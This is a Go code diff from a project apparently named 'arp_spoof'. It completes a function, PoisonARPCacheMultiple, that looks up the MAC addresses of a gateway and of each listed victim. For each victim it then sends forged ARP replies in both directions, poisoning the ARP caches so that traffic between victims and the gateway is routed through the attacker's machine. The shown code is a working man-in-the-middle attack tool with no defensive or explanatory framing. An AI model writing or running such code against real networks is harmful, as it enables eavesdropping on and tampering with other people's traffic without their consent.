@@ -2,6 +2,7 @@ package arp
 
 import (
 	"arp_spoof/network"
+	"fmt"
 	"net"
 	"sync"
 
@@ -50,13 +51,36 @@ func sendARPReply(from, to, attackerInfo *network.DeviceInfo, deviceHandle *pcap
 func PoisonARPCacheMultiple(gateway net.IP, victims []net.IP, attackerInfo *network.DeviceInfo, deviceHandle *pcap.Handle) error {
 	var wg sync.WaitGroup
 
+	gatewayDevice, err := network.MapIPstoMAC([]net.IP{gateway})
+	if err != nil {
+		return err
+	}
+
 	for _, victim := range victims {
 		wg.Add(1)
 
-		go func() {
+		go func(victim net.IP) {
 			defer wg.Done()
+			defer func() {
+				if err := recover(); err != nil {
+					fmt.Println("error in sending ARP reply")
+				}
+			}()
 
-		}()
+			victimDevice, err := network.MapIPstoMAC([]net.IP{victim})
+			if err != nil {
+				panic(err)
+			}
+
+			if err := sendARPReply(gatewayDevice[0], victimDevice[0], attackerInfo, deviceHandle); err != nil {
+				panic(err)
+			}
+
+			if err := sendARPReply(victimDevice[0], gatewayDevice[0], attackerInfo, deviceHandle); err != nil {
+				panic(err)
+			}
+
+		}(victim)
 
 	}
 	wg.Wait()
